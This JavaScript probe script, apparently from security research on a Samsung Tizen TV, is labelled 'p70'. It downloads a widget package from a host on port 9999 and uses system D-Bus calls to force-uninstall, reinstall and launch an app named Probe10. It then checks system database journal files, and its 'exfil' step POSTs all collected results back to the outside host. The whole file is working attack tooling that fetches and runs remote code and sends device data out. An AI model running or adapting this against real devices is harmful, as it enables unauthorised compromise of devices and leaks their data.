"use strict";

/* p70: WAS reinstall Probe10 (fresh context) + launch
   A. HTTP GET probe10.wgt from Mac :9999 -> sdk_tools/Probe10.wgt (md5 verify 319bcdaf52a9ff7f74fd11951f0e7685)
   B. terminate_app(Probe10)
   C. was_uninstall_app(Probe10, is_force=1)
   D. was_install_app(packet_path=sdk_tools/Probe10.wgt)
   E. launch_app (19 args, forceLaunch=1)
   F. wait 90s (fresh p71 flow) + verify DST/LIVE + apps_rw state + showing app
   exfil /p70info
 */

var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var MARKDIR = '/home/owner/share/tmp/sdk_tools';
var WGT_LOCAL = MARKDIR + '/Probe10.wgt';
var WGT_MD5 = '319bcdaf52a9ff7f74fd11951f0e7685';
var APP = 'ProbeTenio.Probe10';
var LITE = 'org.tizen.tv.litewebappservice.server';
var LITE_PATH = '/org/tizen/tv/litewebappservice/server';
var LITE_IFACE = 'org.tizen.tv.litewebappservice.server.interface';
var WAS = 'org.tizen.tv.webappservice.server';
var WAS_PATH = '/org/tizen/tv/webappservice/server';
var WAS_IFACE = 'org.tizen.tv.webappservice.server.interface';
var R = { ts: new Date().toISOString(), probe: 'p70', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p70info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function sleepSync(ms) {
  try { cp.execSync('sleep ' + Math.ceil(ms / 1000), { timeout: ms + 30000, maxBuffer: 4096 }); } catch (e) {}
}

function httpGetTo(host, port, path, destFile, cb) {
  var s;
  try { s = net.connect(port, host); } catch (e) { cb('ctor ' + e); return; }
  var raw = '';
  var cut = -1;
  var finished = false;
  var finish = function (err, size) {
    if (finished) return;
    finished = true;
    try { s.destroy(); } catch (e) {}
    cb(err, size);
  };
  s.setTimeout(90000, function () { finish('timeout'); });
  s.on('connect', function () {
    s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + host + ':9999\r\nConnection: close\r\n\r\n');
  });
  s.on('data', function (chunk) {
    raw += chunk.toString('binary');
    if (cut < 0) {
      var idx = raw.indexOf('\r\n\r\n');
      if (idx >= 0) cut = idx + 4;
    }
  });
  s.on('end', function () {
    try {
      if (cut < 0) { finish('no-header-end'); return; }
      var body = raw.substring(cut);
      fs.writeFileSync(destFile, new Buffer(body, 'binary'));
      finish(null, body.length);
    } catch (e) { finish(String(e)); }
  });
  s.on('error', function (e) { finish(e.message); });
  s.on('close', function () { finish('closed-early'); });
}

function md5OfFile(p) {
  try {
    var h = crypto.createHash('md5');
    h.update(fs.readFileSync(p), 'binary');
    return h.digest('hex');
  } catch (e) { return 'ERR ' + e; }
}

function main() {
  /* ---------- A. download WGT ---------- */
  httpGetTo(HOST, PORT, '/probe10.wgt', WGT_LOCAL, function (err, size) {
    if (err) { R.results.a_download = 'ERR ' + err; finishFlow(); return; }
    R.results.a_download = 'size=' + size + ' md5=' + md5OfFile(WGT_LOCAL) + ' expected=' + WGT_MD5;
    finishFlow();
  });

  function finishFlow() {
    /* ---------- B. terminate ---------- */
    R.results.b_terminate = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.terminate_app string:"' + APP + '" int32:0 2>&1 | head -10', 45000);
    sleepSync(8000);

    /* ---------- C. uninstall ---------- */
    R.results.c_uninstall = run('dbus-send --system --print-reply --dest=' + WAS + ' --type=method_call ' + WAS_PATH + ' ' + WAS_IFACE + '.was_uninstall_app int32:0 string:"p70" int32:0 int32:0 string:"' + APP + '" int32:1 int32:0 int32:0 int32:0 string:"p70-uninstall" 2>&1 | head -12', 60000);
    sleepSync(10000);

    /* ---------- D. install ---------- */
    R.results.d_install = run('dbus-send --system --print-reply --dest=' + WAS + ' --type=method_call ' + WAS_PATH + ' ' + WAS_IFACE + '.was_install_app int32:0 string:"p70" int32:0 int32:0 string:"' + APP + '" string:"' + WGT_LOCAL + '" string:"" int32:0 int32:0 int32:0 string:"p70-install" 2>&1 | head -12', 60000);
    sleepSync(15000);

    /* ---------- E. launch ---------- */
    R.results.e_launch = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.launch_app string:"p70" int32:0 string:"' + APP + '" string:"" string:"p70" int32:0 int32:0 int32:0 string:"launch" int32:1 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 2>&1 | head -10', 45000);

    /* ---------- F. wait for fresh p71 flow ---------- */
    sleepSync(90000);

    R.results.f1_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===WGT; ls -la ' + WGT_LOCAL + ' 2>&1', 20000);
    R.results.f2_appdir = run('ls -la /opt/usr/home/owner/apps_rw/ 2>&1 | grep -E "Probe|total" | head -8; echo ===T10; ls -la /opt/usr/home/owner/apps_rw/ProbeTenio/ 2>&1 | head -15', 20000);
    R.results.f3_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.get_current_showing_app 2>&1 | head -8', 30000);

    R.results.final = 'done ' + new Date().toISOString();
    L('done');
    postFinal();
    setTimeout(postFinal, 20000);
  }
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
